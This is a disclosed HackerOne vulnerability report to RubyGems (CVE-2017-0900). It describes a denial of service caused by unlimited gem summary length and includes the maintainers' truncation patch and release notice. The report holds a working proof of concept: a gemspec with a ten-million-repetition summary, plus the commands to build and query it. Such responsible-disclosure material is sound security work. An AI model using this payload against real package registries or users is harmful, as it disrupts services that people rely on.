{"id":243003,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNDMwMDM=","url":"https://hackerone.com/reports/243003","title":"No limit of summary length allows Denail of Service","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2017-06-25T07:53:33.914Z","submitted_at":"2017-06-25T07:53:33.914Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"mame","url":"/mame","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":8212,"url":"https://hackerone.com/rubygems","handle":"rubygems","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/008/212/e65eca09896d23bc029c08d3147a79a48ec1ee2f_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/212/e65eca09896d23bc029c08d3147a79a48ec1ee2f_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"RubyGems","twitter_handle":"rubygems_status","website":"https://rubygems.org","about":"RubyGems.org is the Ruby communityâ€™s gem hosting service."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2017-0900"],"singular_disclosure_disabled":false,"disclosed_at":"2017-08-31T23:19:29.517Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2017-08-28T16:42:20.199Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Currently, there is no limit for summary length.  I think, pushing a gem whose summary is huge, will make `gem search` unavailable.\n\nThis is not Arbitrary Code Execution, but really easy to attack.  According to CVSS v3.0 Calculator, the severity is High (7.5).\n\n## How to attack\n\n1) An attacker creates a gem with huge summary string, and push it to rubygems.org.\n2) A victim runs `gem search -d \u003csubstring-of-the-name-of-the-gem\u003e`, but it will give no response.\n\nIt may be good for the gem name to include a frequently-searched keyword, such as \"foo-rails-bar\" or \"foo-sinatra-bar\".\n\n## Proof of concept\n\n1) Prepare the following gemspec.\n\n~~~~\nGem::Specification.new do |spec|\n  spec.name     = \"huge-summary\"\n  spec.version  = \"0.0.1\"\n  spec.authors  = [\"Yusuke Endoh\"]\n  spec.email    = [\"mame@ruby-lang.org\"]\n  spec.summary  = \"foo\" * 10000000\n  spec.homepage = \"http://example.com/\"\n  spec.license  = \"MIT\"\nend\n~~~~\n\n2) Run the following commands\n\n~~~~\ngem build huge-summary.gemspec\ngem install huge-summary-0.0.1.gem\n~~~~\n\n3) Run the following command.\n\n~~~~\ngem query huge-summary -d\n~~~~\n\nIt will not answer.","weakness":{"id":48,"name":"Denial of Service"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-09-27T16:42:20.236Z","allow_singular_disclosure_after":-127431969.60157365,"singular_disclosure_allowed":true,"vote_count":5,"voters":["eveeez","silv3rpoision","barbossa","sonalkr132","sonots"],"severity":{"rating":"high","score":7.5,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"none","integrity":"none","availability":"high"}},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1779284,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for submitting this report to RubyGems. Our team will review and investigate the issue. Please note that only issues in the rubygems library are eligible for our bug bounty program.","automated_response":true,"created_at":"2017-06-25T07:53:34.086Z","updated_at":"2017-06-25T07:53:34.086Z","actor":{"url":"/rubygems","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/212/e65eca09896d23bc029c08d3147a79a48ec1ee2f_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"RubyGems"}},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1799087,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The bottleneck seems to be in `Gem::Text#format_text`. One option would be to look into speeding that up, the other is to truncate the summary in `Gem::Commands::QueryCommand#spec_summary` to an arbitrary number of characters","automated_response":false,"created_at":"2017-07-03T12:01:34.523Z","updated_at":"2017-07-03T12:01:34.523Z","actor":{"username":"segiddins","cleared":false,"url":"/segiddins","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1799104,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Something like the following seems to make querying fast _enough_, given the user needs to have installed the gem in the first place for this DOS to take place:\n\n```diff\ndiff --git a/lib/rubygems/commands/query_command.rb b/lib/rubygems/commands/query_command.rb\nindex 0f58490e..7cf65def 100644\n--- a/lib/rubygems/commands/query_command.rb\n+++ b/lib/rubygems/commands/query_command.rb\n@@ -352,7 +352,12 @@ is too hard to use.\n   end\n \n   def spec_summary entry, spec\n-    entry \u003c\u003c \"\\n\\n\" \u003c\u003c format_text(spec.summary, 68, 4)\n+    summary = spec.summary\n+    if summary.size \u003e 100_000\n+      summary = \"Truncating the summary for #{spec.full_name} to 100,000 characters:\\n\" + summary[0, 100_000]\n+    end\n+\n+    entry \u003c\u003c \"\\n\\n\" \u003c\u003c format_text(summary, 68, 4)\n   end\n \n end\n```","automated_response":false,"created_at":"2017-07-03T12:06:30.006Z","updated_at":"2017-07-03T12:06:30.006Z","actor":{"username":"segiddins","cleared":false,"url":"/segiddins","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1958768,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Released in http://blog.rubygems.org/2017/08/27/2.6.13-released.html","automated_response":false,"created_at":"2017-08-28T02:08:56.879Z","updated_at":"2017-08-28T02:08:56.879Z","actor":{"username":"segiddins","cleared":false,"url":"/segiddins","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"mame","url":"/mame"},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1960610,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-08-28T16:42:20.218Z","updated_at":"2017-08-28T16:42:20.218Z","first_to_agree":true,"actor":{"username":"segiddins","cleared":false,"url":"/segiddins","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1967696,"is_internal":false,"editable":false,"type":"Activities::CveIdAdded","message":"","automated_response":false,"created_at":"2017-08-30T23:21:38.328Z","updated_at":"2017-08-30T23:21:38.328Z","cve_ids":["CVE-2017-0900"],"actor":{"username":"indirect","cleared":false,"url":"/indirect","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/097/577/4bb4cd3c39360f43b5fd7df0ae2f35e514826e42_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1967697,"is_internal":false,"editable":false,"type":"Activities::NotEligibleForBounty","message":"Thank you for your report! Based on the [guidelines posted on HackerOne](https://hackerone.com/rubygems#internet-bug-bounty-qualification), this vulnerability will not be awarded a bounty, as it does not allow remote code execution.","automated_response":false,"created_at":"2017-08-30T23:24:14.991Z","updated_at":"2017-08-30T23:24:14.991Z","actor":{"url":"/rubygems","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/212/e65eca09896d23bc029c08d3147a79a48ec1ee2f_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"RubyGems"}},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1969963,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I agree to disclose this ticket.  Thank you very much!","automated_response":false,"created_at":"2017-08-31T23:19:04.170Z","updated_at":"2017-08-31T23:19:04.170Z","actor":{"username":"mame","cleared":false,"url":"/mame","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1969965,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"","automated_response":false,"created_at":"2017-08-31T23:19:29.502Z","updated_at":"2017-08-31T23:19:29.502Z","actor":{"username":"indirect","cleared":false,"url":"/indirect","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/097/577/4bb4cd3c39360f43b5fd7df0ae2f35e514826e42_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}